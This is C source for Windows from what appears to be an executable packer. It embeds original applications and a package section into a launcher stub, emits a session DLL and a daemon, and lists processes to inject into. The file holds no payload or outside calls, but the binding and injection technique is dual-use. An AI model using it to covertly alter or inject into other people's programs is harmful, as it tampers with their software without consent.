#include <windows.h>
#include <assert.h>
#include <stdio.h>
#include "list.h"
#include "global.h"
#include "dll_in_section.h"
#include "package.h"
#include "message_comm.h"

PACKAGE* ori_package = NULL;
STARTUP* ori_startup = NULL;
#define REALLOC_EXTEND_SIZE (0x1000 * 0x100 * 4)

long get_startup_max_size()
{
	return round_up((sizeof(STARTUP) + MAX_PATH*4), 0x1000);
}

STARTUP* append_data_to_startup(void* mem_base, unsigned long mem_size, STORE_ITEM* fill_item)
{
	//如果传入的地址是NULL，则需要从新初始化
	if (mem_base == NULL)
	{
		if (ori_startup)
		{
			free(ori_startup);
			ori_startup = NULL;
		}
	}

	//首次使用，申请空间
	if (ori_startup == NULL)
	{
		ori_startup = (STARTUP*)calloc(get_startup_max_size(), sizeof(char));
		ori_startup->size = sizeof(STARTUP);
	}

	//传入一个没有大小的块，那就当作是取ori_startup的数据，直接返回
	if (mem_size == 0)
	{
		return (ori_startup);
	}

	//复制需要新添加的内容
	memcpy(&ori_startup->buffer[ori_startup->max_index], mem_base, mem_size);

	//填充可能的头节结构
	if (fill_item)
	{
		fill_item->index = ori_startup->max_index;
		fill_item->length = mem_size;
	}

	//记录指针
	ori_startup->max_index += mem_size;
	ori_startup->size += mem_size;

	return (ori_startup);
}

STARTUP* append_string_to_startup(char* add_str, STORE_ITEM* fill_item)
{
	return (add_str)? append_data_to_startup(add_str, strlen(add_str) + sizeof(char), fill_item) : ori_startup;
}

STARTUP* get_startup()
{
	return append_data_to_startup((void*)-1, 0, NULL);
}

STARTUP* init_startup()
{
	return append_data_to_startup(NULL, 0, NULL);
}

/*
			package handle
*/

PACKAGE* append_data_to_package(void* mem_base, unsigned long mem_size, STORE_ITEM* fill_item)
{
	//如果传入的地址是NULL，则需要从新初始化
	if (mem_base == NULL)
	{
		if (ori_package)
		{
			free(ori_package);
			ori_package = NULL;
		}
	}

	//首次使用，申请空间
	if (ori_package == NULL)
	{
		unsigned long alloc_size = round_up(mem_size + REALLOC_EXTEND_SIZE, 0x1000);
		ori_package = (PACKAGE*)calloc(alloc_size, sizeof(char));
		ori_package->alloc_size = alloc_size;
		ori_package->size = sizeof(PACKAGE);
	}

	//传入一个没有大小的块，那就当作是取ori_package的数据，直接返回
	if (mem_size == 0)
	{
		return (ori_package);
	}

	//如果不够空间，则扩展
	if ((ori_package->alloc_size - ori_package->max_index - sizeof(PACKAGE)) < mem_size)
	{
		//看看fill_item是否指向ori_package本身的内存块
		int is_need_move = VALIDRANGE(fill_item, ori_package, ori_package->size);
		void* old_ptr = (void*)ori_package;

		//申请空间
		unsigned long new_add_size = round_up(mem_size + REALLOC_EXTEND_SIZE, 0x1000);
		ori_package = (PACKAGE*)realloc(ori_package, ori_package->alloc_size + new_add_size);
		ori_package->alloc_size += new_add_size;

		//看情况修改fill_item
		if (fill_item)
		{
			long move_offset = (long)ori_package - (long)old_ptr;
			if ((is_need_move) && (move_offset))
			{
				fill_item = (STORE_ITEM*)((long)fill_item + move_offset);
				DbgPrint("fill_item addr changed: %x -> %x", old_ptr, ori_package);
			}
		}
	}

	//复制需要新添加的内容
	memcpy(&ori_package->buffer[ori_package->max_index], mem_base, mem_size);

	//填充可能的头节结构
	if (fill_item)
	{
		fill_item->index = ori_package->max_index;
		fill_item->length = mem_size;
	}

	//记录指针
	ori_package->max_index += mem_size;
	ori_package->size += mem_size;

	return (ori_package);
}

PACKAGE* append_string_to_package(char* add_str, STORE_ITEM* fill_item)
{
	return (add_str)? append_data_to_package(add_str, strlen(add_str) + sizeof(char), fill_item) : ori_package;
}

PACKAGE* append_file_to_package(char* full_file_name, STORE_ITEM* fill_item)
{
	long file_size;
	void* file_memory = mem_from_file(full_file_name, &file_size, 0);
	return (file_memory)? append_data_to_package(file_memory, file_size, fill_item) : ori_package;
}

PACKAGE* get_package()
{
	return append_data_to_package((void*)-1, 0, NULL);
}

PACKAGE* init_package()
{
	return append_data_to_package(NULL, 0, NULL);
}


int get_list_count(List list)
{
	Position walk = Header(list);

	if (IsEmptyLst(list))
	{
		return (0);
	}

	int run_result = 0;
	do
	{
		walk = Advance(walk);
		run_result++;
	}while(!IsLast(walk, list));

	return (run_result);
}

STARTUP* append_list_string_to_startup(List list, STORE_ITEM* fill_item)
{
	Position walk = Header(list);
	int item_count = get_list_count(list);

	if (item_count == 0)
	{
		return get_startup();
	}

	STORE_ITEM* item_dir = calloc(item_count + 1, sizeof(STORE_ITEM));
	int i = 0;

	char* got_str;
	do
	{
		walk = Advance(walk);
		got_str = (char*)Retrieve(walk);
		append_string_to_startup(got_str, &item_dir[i++]);
	}while(!IsLast(walk, list));

	return append_data_to_startup(item_dir, (item_count+1) * sizeof(STORE_ITEM), fill_item);
}

char* stub_make_session_apps(PACKAGE* package, SEARCH_PARAM *search)
{
	int run_result = 0;
	char* root_dir = search->root_dir;
	assert(package);
	assert(root_dir);

	void* session_dll = (void*)PACKAGE(package->session_dll);
	long session_dll_size = package->session_dll.length;

	assert(session_dll);
	assert(session_dll_size);

	//生成session.dll，添加package节段
	long output_size;
	void* output_base = append_section(session_dll, session_dll_size, &output_size, PACKAGE_SECTION_NAME, package, package->size);
	
	//准备startup节段
	STARTUP* startup = init_startup();
	append_string_to_startup(root_dir, &startup->root_path);
	append_string_to_startup(GetCommandLineA(), &startup->stub_command_line);

	char session_dll_name[MAX_PATH];
	sprintf(session_dll_name, "%s%s", root_dir, DAEMON_EXE_NAME);
	char* daemon_process_name = strdup(session_dll_name);
	append_string_to_startup(session_dll_name, &startup->daemon_process);
	sprintf(session_dll_name, "%s%s", root_dir, SESSION_DLL_NAME);
	append_string_to_startup(session_dll_name, &startup->session_dll);

	DbgPrint("root_dir: %s", (char*)STARTUP(startup->root_path));
	DbgPrint("daemon: %s", (char*)STARTUP(startup->daemon_process));
	DbgPrint("session: %s", (char*)STARTUP(startup->session_dll));

	startup->stub_is_launch=(is_section_exists_main(ORIGIN_APP_SECTION_NAME))? 0 : 1;
	startup->stub_process_id = GetCurrentProcessId();
	DWORD pid =  get_parent_process_id();
	startup->stub_parent_process_id = pid;
	append_string_to_startup(pid_to_exepath(pid), &startup->stub_parent_process);
	append_string_to_startup(current_process_name(), &startup->stub_process_name);

	//添加动态生成的“内核对象名字”,daemon调试通道名
	append_string_to_startup(gen_guid_str(), &startup->daemon_dbg_name);
	append_string_to_startup(gen_guid_str(), &startup->share_mutex_name);

	//添加实际的被打包文件名和被注入进程文件名
	append_list_string_to_startup(search->repack_list, &startup->realy_repack_apps);
	append_list_string_to_startup(search->plugto_list, &startup->realy_plugin_apps);
	append_list_string_to_startup(search->map_list, &startup->map_file_names);

	//添加startup节段
	long output_file_size;
	char* output_file_base = append_section(output_base, output_size, &output_file_size, STUB_START_SECTION_NAME, startup, startup->size);

	//产生2个pe文件
	if (mem_to_file(session_dll_name, output_file_base, output_file_size) == 0)
	{
		run_result--;
	}

	char* daemon_base = (void*)PACKAGE(package->daemon_exe);
	if (mem_to_file(daemon_process_name, daemon_base, package->daemon_exe.length) == 0)
	{
		run_result--;
	}

	return ((run_result == 0)? daemon_process_name : NULL);
}

void* make_launch(PACKAGE* package, long* launch_size)
{
	void* stub_base = (void*)PACKAGE(package->stub_exe);
	long stub_size = package->stub_exe.length;

	assert(stub_base);
	assert(stub_size);

	long section_va;
	long section_raw;
	append_section_try(stub_base, &section_va, &section_raw);

	long output_size;
	void* launch_exe = append_section(stub_base, stub_size, &output_size, PACKAGE_SECTION_NAME, package, package->size);

	PACKAGE* package_out = (PACKAGE*)RVATOVA(launch_exe, section_raw);
	package_out->repack_whoami_index = -1;

	*launch_size = output_size;
	return (launch_exe);
}

char* find_repack_name(PACKAGE* package, int index)
{
	STORE_ITEM* repack_item = (STORE_ITEM*)PACKAGE(package->repack_app_dir);
	char* file_name = (char*)PACKAGE(repack_item[index]);
	return (strdup(file_name));
}

int find_repack_index(PACKAGE* package, const char* ori_name)
{
	STORE_ITEM* repack_item = (STORE_ITEM*)PACKAGE(package->repack_app_dir);

	int index = 0;
	while (repack_item->length)
	{
		char* file_name = (char*)PACKAGE(*repack_item);
		if (stricmp(file_name, ori_name) == 0)
		{
			return (index);
		}

		index++;
		repack_item++;
	}
	
	return (-1);
}

void* get_ori_app_from_file(const char* app_file, long* app_file_size, int cover_repack)
{
	long  ori_file_size;
	void* ori_file_base = mem_from_file(app_file, &ori_file_size, 0);

	if (ori_file_base == NULL)
	{
		DbgPrint("read file error, by pass");
		return (NULL);
	}

	//判断：如果打包过，则忽略
	if (is_section_exists(ori_file_base, PACKAGE_SECTION_NAME))
	{
		if (cover_repack)
		{
			DbgPrint("has been packed, only get \"STOREAPP\"");
			PIMAGE_SECTION_HEADER s_storepe = get_spectial_section_byname(ori_file_base, ORIGIN_APP_SECTION_NAME);

			if (s_storepe)
			{
				void* storepe_base = (void*)RVATOVA(ori_file_base, s_storepe->PointerToRawData);
				long  storepe_size = s_storepe->Misc.VirtualSize;

				void* result_mem = malloc(storepe_size);
				memcpy(result_mem, storepe_base, storepe_size);

				free(ori_file_base);
				*app_file_size = storepe_size;
				return (result_mem);
			}

			DbgPrint("get \"STOREAPP\" section error!");
		}

		DbgPrint("has been packed, by pass");
		free(ori_file_base);
		return (NULL);
	}

	*app_file_size = ori_file_size;
	return (ori_file_base);
}

void* make_repack_app(const char* ori_name, const char* app_file, const void* launch_exe, long launch_size, long* repack_size, int cover_repack)
{
	assert(ori_name);
	assert(app_file);
	assert(launch_exe);

	//读取原始被打包文件
	DbgPrint("src filename: %s", app_file);

	long  app_file_size;
	void* app_file_base = get_ori_app_from_file(app_file, &app_file_size, cover_repack);

	if (app_file_base == NULL)
	{
		DbgPrint("get app file error, by pass");
		return (NULL);
	}

	//将“原始应用”打包成一个节段，塞入pe模版文件中。
	long output_file_size;
	char* output_file_base = append_section_mainpe(launch_exe, launch_size, &output_file_size, ORIGIN_APP_SECTION_NAME, app_file_base, app_file_size);

	if (output_file_base == NULL)
	{
		DbgPrint("make mainpe error");
		return (NULL);
	}

	//修正package节段的信息
	PIMAGE_SECTION_HEADER p_section = get_spectial_section_byname(output_file_base, PACKAGE_SECTION_NAME);

	if (p_section == NULL)
	{
		DbgPrint("repack get section error");
		return (NULL);
	}

	PACKAGE* package = (PACKAGE*)RVATOVA(output_file_base, p_section->PointerToRawData);
	package->repack_whoami_index = find_repack_index(package, ori_name);

	//输出结果
	*repack_size = output_file_size;
	return (output_file_base);
}

int copack_make_package_apps(PACKAGE* package, char* root_dir, char* output_dir)
{
	assert(package);
	assert(root_dir);

	int run_result = 0;
	long launch_size;
	void* launch_exe = make_launch(package, &launch_size);

	char* file_name;
	char src_pe_file[MAX_PATH];

	/*
	   如果需要，则生成launch，其实就是直接释放出来，launch和普通repack的区别，仅仅在于：
	   1）是否设置了repack_whoami_index,标名repack的真实名字
	   2）有没有STOREPE节段，这是存储pe文件的节段
	 */

	if (package->launch_exe.length)
	{
		file_name = (char*)PACKAGE(package->launch_exe);

		if (output_dir)
		{
			char* short_name = seek_short_file_name(file_name);
			sprintf(src_pe_file, "%slaunch_%s", output_dir, short_name);
		}
		else
		{
			sprintf(src_pe_file, "%slaunch_%s", root_dir, file_name);
		}

		DbgPrint("launch filename: %s", src_pe_file);
		if (mem_to_file(src_pe_file, launch_exe, launch_size) == 0)
		{
			DbgPrint("launch release error");
			run_result--;
		}
	}

	//打包程序
	if (package->repack_app_dir.length)
	{
		STORE_ITEM* repack_item = (STORE_ITEM*)PACKAGE(package->repack_app_dir);

		while (repack_item->length)
		{
			file_name = (char*)PACKAGE(*repack_item);
			sprintf(src_pe_file, "%s%s", root_dir, file_name);
			
			long output_file_size;
			char* output_file_base = make_repack_app(file_name, src_pe_file, launch_exe, launch_size, &output_file_size, 1);

			//确定输出目录
			if (output_dir)
			{
				char* short_name = seek_short_file_name(file_name);
				sprintf(src_pe_file, "%s%s", output_dir, short_name);
			}

			//覆盖或输出生成的文件
			DbgPrint("dist filename : %s", src_pe_file);
			if (mem_to_file(src_pe_file, output_file_base, output_file_size) == 0)
			{
				run_result--;
			}

			repack_item++;
		}
	}

	return (run_result);
}

